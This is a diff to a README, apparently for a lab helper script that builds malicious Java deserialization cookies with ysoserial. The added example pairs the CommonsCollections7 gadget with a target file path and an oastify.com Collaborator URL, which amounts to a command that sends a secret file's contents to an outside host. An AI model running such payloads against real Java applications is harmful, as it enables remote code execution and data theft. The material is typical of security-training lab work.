@@ -10,3 +10,8 @@ A copy of `ysoserial-all.jar` (from https://github.com/frohoff/ysoserial) has to
 # Command
 ./generate_java_cookie.sh <GADGET> <COMMAND>
 ```
+
+## Example
+```
+./generate_java_cookie.sh CommonsCollections7 "/home/carlos/secret" https://7fnoyx97nb1dmof2mfvezl6h88ez2rqg.oastify.com
+```
